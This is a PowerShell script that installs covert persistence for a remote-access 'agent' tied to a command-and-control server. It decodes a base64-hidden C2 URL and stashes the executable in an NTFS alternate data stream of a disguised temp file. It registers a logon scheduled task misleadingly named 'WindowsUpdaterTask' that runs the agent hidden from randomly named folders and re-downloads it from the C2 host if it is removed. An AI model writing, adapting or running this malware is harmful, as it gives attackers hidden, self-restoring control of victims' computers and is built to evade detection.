param($args)

$agentPath = $env:AgentPath
if (-not $agentPath) {
    Write-Output "❌ AgentPath environment variable not set."
    exit
}

# ============================================================
# CONFIGURATION – CHANGE THIS TO YOUR C2 URL
# ============================================================
$encodedUrl = "aHR0cHM6Ly9jMi1zZXJ2ZXJ2Mi1xeHZsLm9ucmVuZGVyLmNvbQ=="
$c2BaseUrl = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedUrl))

# ============================================================
# 1. Carrier file in C:\Windows\Temp (backup)
# ============================================================
$carrierFile = "C:\Windows\Temp\~DF539A.tmp"
$streamName = "thumbs.db"

# Ensure carrier file exists (create if missing)
if (-not (Test-Path $carrierFile)) {
    Set-Content -Path $carrierFile -Value "[Temp File]" -Encoding ASCII
    Write-Output "[+] Created carrier file: $carrierFile"
} else {
    Write-Output "[+] Using existing carrier file: $carrierFile"
}

# ============================================================
# 2. Hide the real agent in the carrier file's ADS (backup)
# ============================================================
Write-Output "[+] Hiding real agent in ADS (backup)..."
$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
Set-Content -Path $carrierFile -Stream $streamName -Value $agentBytes -Encoding Byte
$hiddenPath = "$carrierFile`:$streamName"
Write-Output "[+] Real agent hidden at: $hiddenPath"

# ============================================================
# 3. Create the extraction script (run.ps1) in C:\Windows\Temp
#    This script will run at every logon and handle cleanup.
# ============================================================
$scriptPath = "C:\Windows\Temp\run.ps1"
$extractCode = @"
# ===== AGENT LAUNCHER WITH AUTO-CLEANUP AND RANDOM FOLDER PER BOOT =====
`$carrierFile = '$carrierFile'
`$streamName = '$streamName'
`$agentUrl = '$c2BaseUrl/agent.exe'

# ---- Generate a new random folder name for this boot ----
`$randomName = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 8 | ForEach-Object { [char]`$_ })
`$targetDir = "`$env:TEMP\`$randomName.tmp"
`$agentFile = "`$targetDir\agent.exe"

# ---- Cleanup: delete any old hidden folders containing agent.exe ----
Get-ChildItem -Path `$env:TEMP -Directory -Hidden | Where-Object {
    `$_.Name -like '*.tmp' -and (Test-Path "`$(`$_.FullName)\agent.exe") -and `$_.FullName -ne `$targetDir
} | ForEach-Object {
    Remove-Item -Path `$_.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

# ---- Try to extract from carrier first ----
if (Test-Path `$carrierFile) {
    `$bytes = Get-Content -Path `$carrierFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
    if (`$bytes) {
        # Ensure target directory exists and is hidden
        if (-not (Test-Path `$targetDir)) {
            New-Item -ItemType Directory -Path `$targetDir -Force | Out-Null
            attrib +h `$targetDir
        }
        [System.IO.File]::WriteAllBytes(`$agentFile, `$bytes)
        attrib +h `$agentFile
        Start-Process -WindowStyle Hidden `$agentFile
        exit
    }
}

# ---- Fallback: download fresh agent ----
try {
    Invoke-WebRequest -Uri `$agentUrl -OutFile `$agentFile -ErrorAction Stop
    # Create and hide the folder if needed
    if (-not (Test-Path `$targetDir)) {
        New-Item -ItemType Directory -Path `$targetDir -Force | Out-Null
        attrib +h `$targetDir
    }
    attrib +h `$agentFile
} catch {
    exit
}

# ---- Recreate carrier file with hidden agent for next boot ----
if (Test-Path `$agentFile) {
    `$newBytes = [System.IO.File]::ReadAllBytes(`$agentFile)
    if (-not (Test-Path `$carrierFile)) {
        Set-Content -Path `$carrierFile -Value "[Temp File]" -Encoding ASCII
    }
    Set-Content -Path `$carrierFile -Stream `$streamName -Value `$newBytes -Encoding Byte
    Start-Process -WindowStyle Hidden `$agentFile
}
"@

Set-Content -Path $scriptPath -Value $extractCode -Encoding ASCII -Force
# Hide the script file (optional)
attrib +h $scriptPath 2>$null
Write-Output "[+] Extraction script created: $scriptPath"

# ============================================================
# 4. Create/update scheduled task via COM (no password prompt)
# ============================================================
$taskName = "WindowsUpdaterTask"

try {
    # Connect to Task Scheduler
    $taskService = New-Object -ComObject Schedule.Service
    $taskService.Connect()
    $rootFolder = $taskService.GetFolder("\")

    # Delete any existing task
    try { $rootFolder.DeleteTask($taskName, 0) } catch { }

    # Create a new task definition
    $taskDefinition = $taskService.NewTask(0)
    $taskDefinition.RegistrationInfo.Description = "Windows Updater Task"
    $taskDefinition.Principal.UserId = $env:USERNAME
    $taskDefinition.Principal.LogonType = 3   # TASK_LOGON_INTERACTIVE_TOKEN

    # Add a logon trigger
    $trigger = $taskDefinition.Triggers.Create(9)   # TASK_TRIGGER_LOGON
    $trigger.UserId = $env:USERNAME

    # Add the action: run the extraction script
    $action = $taskDefinition.Actions.Create(0)   # TASK_ACTION_EXEC
    $action.Path = "powershell.exe"
    $action.Arguments = "-WindowStyle Hidden -File `"$scriptPath`""

    # Register the task (6 = UpdateOrCreate)
    $rootFolder.RegisterTaskDefinition($taskName, $taskDefinition, 6, $null, $null, 3) | Out-Null
    Write-Output "[+] Scheduled task '$taskName' created via COM. Agent will run at next logon."
} catch {
    Write-Output "[-] Failed to create scheduled task: $_"
}

# ============================================================
# 5. Done – original agent remains (you may delete it later)
# ============================================================
Write-Output ""
Write-Output "✅ PERSISTENCE COMPLETE"
Write-Output "Real agent hidden in ADS: $hiddenPath"
Write-Output "At each boot, the agent will be extracted to a NEW random hidden folder in %TEMP%."
Write-Output "Old agent folders are automatically deleted."
Write-Output "Original agent still at: $agentPath (you may delete it after reboot)"
Write-Output "If the hidden file is ever deleted, the scheduled task will auto‑recover by downloading from C2."